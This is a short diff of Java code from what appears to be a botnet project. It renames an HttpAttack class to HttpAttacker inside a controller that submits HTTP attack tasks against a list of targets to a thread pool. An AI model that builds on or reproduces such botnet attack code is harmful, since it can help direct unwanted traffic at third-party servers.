@@ -32,7 +32,7 @@ import com.acmutv.botnet.config.serial.AppConfigurationFormat;
 import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.HttpAttacker;
 import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
@@ -466,7 +466,7 @@ public class CoreController {
     final Map<String,String> props = new HashMap<>();
     props.put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
     targets.forEach(target -> {
-      HttpAttack attacker = new HttpAttack(method, target, props);
+      HttpAttacker attacker = new HttpAttacker(method, target, props);
       POOL.submit(attacker);
     });
     LOGGER.info("Attack scheduled");
